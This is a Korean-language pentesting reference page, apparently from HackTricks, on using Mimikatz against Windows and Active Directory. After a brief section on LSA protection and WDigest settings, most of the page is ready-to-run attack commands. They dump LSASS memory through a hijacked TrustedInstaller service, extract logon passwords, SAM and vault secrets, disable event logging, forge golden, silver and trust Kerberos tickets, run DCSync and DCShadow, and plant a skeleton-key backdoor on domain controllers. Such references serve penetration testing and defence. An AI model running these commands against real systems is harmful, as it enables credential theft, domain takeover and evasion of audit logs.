# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**이 페이지는 [adsecurity.org](https://adsecurity.org/?page_id=1821)의 내용을 기반으로 합니다**. 추가 정보는 원본을 확인하세요!

## 메모리의 LM 및 평문

Windows 8.1 및 Windows Server 2012 R2 이후로, 자격 증명 도난을 방지하기 위한 중요한 조치가 시행되었습니다:

- **LM 해시 및 평문 비밀번호**는 보안을 강화하기 위해 더 이상 메모리에 저장되지 않습니다. 특정 레지스트리 설정인 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_을 DWORD 값 `0`으로 구성하여 Digest Authentication을 비활성화해야 하며, 이를 통해 "평문" 비밀번호가 LSASS에 캐시되지 않도록 합니다.

- **LSA 보호**는 로컬 보안 권한(LSA) 프로세스를 무단 메모리 읽기 및 코드 주입으로부터 보호하기 위해 도입되었습니다. 이는 LSASS를 보호된 프로세스로 표시함으로써 이루어집니다. LSA 보호를 활성화하려면:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_에서 레지스트리를 수정하여 `RunAsPPL`을 `dword:00000001`로 설정합니다.
2. 관리되는 장치에서 이 레지스트리 변경을 시행하는 그룹 정책 개체(GPO)를 구현합니다.

이러한 보호에도 불구하고, Mimikatz와 같은 도구는 특정 드라이버를 사용하여 LSA 보호를 우회할 수 있지만, 이러한 행동은 이벤트 로그에 기록될 가능성이 높습니다.

### SeDebugPrivilege 제거에 대한 대응

관리자는 일반적으로 SeDebugPrivilege를 가지고 있어 프로그램을 디버깅할 수 있습니다. 이 권한은 무단 메모리 덤프를 방지하기 위해 제한될 수 있으며, 이는 공격자가 메모리에서 자격 증명을 추출하는 데 사용하는 일반적인 기술입니다. 그러나 이 권한이 제거되더라도, TrustedInstaller 계정은 사용자 정의 서비스 구성을 사용하여 여전히 메모리 덤프를 수행할 수 있습니다:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
이것은 `lsass.exe` 메모리를 파일로 덤프할 수 있게 하며, 이후 다른 시스템에서 분석하여 자격 증명을 추출할 수 있습니다:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz 옵션

Mimikatz에서 이벤트 로그 변조는 두 가지 주요 작업을 포함합니다: 이벤트 로그 지우기 및 새로운 이벤트 로깅을 방지하기 위해 이벤트 서비스를 패치하는 것입니다. 아래는 이러한 작업을 수행하기 위한 명령어입니다:

#### 이벤트 로그 지우기

- **명령어**: 이 작업은 이벤트 로그를 삭제하여 악의적인 활동을 추적하기 어렵게 만드는 것을 목표로 합니다.
- Mimikatz는 명령줄을 통해 이벤트 로그를 직접 지우기 위한 직접적인 명령어를 표준 문서에서 제공하지 않습니다. 그러나 이벤트 로그 조작은 일반적으로 Mimikatz 외부의 시스템 도구나 스크립트를 사용하여 특정 로그를 지우는 것을 포함합니다 (예: PowerShell 또는 Windows Event Viewer 사용).

#### 실험적 기능: 이벤트 서비스 패치

- **명령어**: `event::drop`
- 이 실험적 명령어는 이벤트 로깅 서비스의 동작을 수정하여 새로운 이벤트를 기록하지 않도록 설계되었습니다.
- 예시: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` 명령어는 Mimikatz가 시스템 서비스를 수정하는 데 필요한 권한으로 작동하도록 보장합니다.
- 그 후 `event::drop` 명령어가 이벤트 로깅 서비스를 패치합니다.

### Kerberos 티켓 공격

### 골든 티켓 생성

골든 티켓은 도메인 전체 접근을 가장할 수 있게 해줍니다. 주요 명령어 및 매개변수:

- 명령어: `kerberos::golden`
- 매개변수:
- `/domain`: 도메인 이름.
- `/sid`: 도메인의 보안 식별자(SID).
- `/user`: 가장할 사용자 이름.
- `/krbtgt`: 도메인의 KDC 서비스 계정의 NTLM 해시.
- `/ptt`: 티켓을 메모리에 직접 주입합니다.
- `/ticket`: 나중에 사용할 티켓을 저장합니다.

예시:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets는 특정 서비스에 대한 접근을 허용합니다. 주요 명령어 및 매개변수:

- Command: Golden Ticket과 유사하지만 특정 서비스를 대상으로 합니다.
- Parameters:
- `/service`: 대상 서비스 (예: cifs, http).
- 기타 매개변수는 Golden Ticket과 유사합니다.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### 신뢰 티켓 생성

신뢰 티켓은 신뢰 관계를 활용하여 도메인 간 리소스에 접근하는 데 사용됩니다. 주요 명령 및 매개변수:

- 명령: Golden Ticket과 유사하지만 신뢰 관계에 대한 것입니다.
- 매개변수:
- `/target`: 대상 도메인의 FQDN.
- `/rc4`: 신뢰 계정의 NTLM 해시.

예:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### 추가 Kerberos 명령어

- **티켓 나열**:

- 명령어: `kerberos::list`
- 현재 사용자 세션의 모든 Kerberos 티켓을 나열합니다.

- **캐시 전달**:

- 명령어: `kerberos::ptc`
- 캐시 파일에서 Kerberos 티켓을 주입합니다.
- 예: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **티켓 전달**:

- 명령어: `kerberos::ptt`
- 다른 세션에서 Kerberos 티켓을 사용할 수 있게 합니다.
- 예: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **티켓 정리**:
- 명령어: `kerberos::purge`
- 세션의 모든 Kerberos 티켓을 지웁니다.
- 충돌을 피하기 위해 티켓 조작 명령어를 사용하기 전에 유용합니다.

### Active Directory 변조

- **DCShadow**: AD 객체 조작을 위해 기계를 DC처럼 일시적으로 작동하게 합니다.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DC를 모방하여 비밀번호 데이터를 요청합니다.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 자격 증명 접근

- **LSADUMP::LSA**: LSA에서 자격 증명을 추출합니다.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: 컴퓨터 계정의 비밀번호 데이터를 사용하여 DC를 가장합니다.

- _원본 맥락에서 NetSync에 대한 특정 명령어가 제공되지 않음._

- **LSADUMP::SAM**: 로컬 SAM 데이터베이스에 접근합니다.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: 레지스트리에 저장된 비밀을 복호화합니다.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: 사용자에 대한 새로운 NTLM 해시를 설정합니다.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 신뢰 인증 정보를 검색합니다.
- `mimikatz "lsadump::trust" exit`

### 기타

- **MISC::Skeleton**: DC의 LSASS에 백도어를 주입합니다.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### 권한 상승

- **PRIVILEGE::Backup**: 백업 권한을 획득합니다.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: 디버그 권한을 얻습니다.
- `mimikatz "privilege::debug" exit`

### 자격 증명 덤프

- **SEKURLSA::LogonPasswords**: 로그인한 사용자의 자격 증명을 표시합니다.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: 메모리에서 Kerberos 티켓을 추출합니다.
- `mimikatz "sekurlsa::tickets /export" exit`

### SID 및 토큰 조작

- **SID::add/modify**: SID 및 SIDHistory를 변경합니다.

- 추가: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- 수정: _원본 맥락에서 수정에 대한 특정 명령어가 제공되지 않음._

- **TOKEN::Elevate**: 토큰을 가장합니다.
- `mimikatz "token::elevate /domainadmin" exit`

### 터미널 서비스

- **TS::MultiRDP**: 여러 RDP 세션을 허용합니다.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP 세션을 나열합니다.
- _원본 맥락에서 TS::Sessions에 대한 특정 명령어가 제공되지 않음._

### 금고

- Windows 금고에서 비밀번호를 추출합니다.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
